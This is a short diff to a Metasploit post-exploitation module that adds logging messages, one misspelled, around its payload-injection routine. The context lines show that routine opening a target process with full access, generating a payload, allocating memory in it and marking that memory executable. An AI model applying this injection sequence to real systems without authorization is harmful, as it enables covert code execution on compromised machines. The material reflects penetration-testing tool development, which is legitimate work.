@@ -186,8 +186,11 @@ class Metasploit3 < Msf::Post
 			pid = create_temp_proc(pay) if newproc
 			print_status("Injecting #{pay.name} into process ID #{pid}")
 			begin
+				print_status("Opening process #{pid}")
 				host_process = client.sys.process.open(pid.to_i, PROCESS_ALL_ACCESS)
+				print_status("Generating payload")
 				raw = pay.generate
+				print_status("Allocating memory in procees #{pid}")
 				mem = host_process.memory.allocate(raw.length + (raw.length % 1024))
 				# Ensure memory is set for execution
 				host_process.memory.protect(mem)
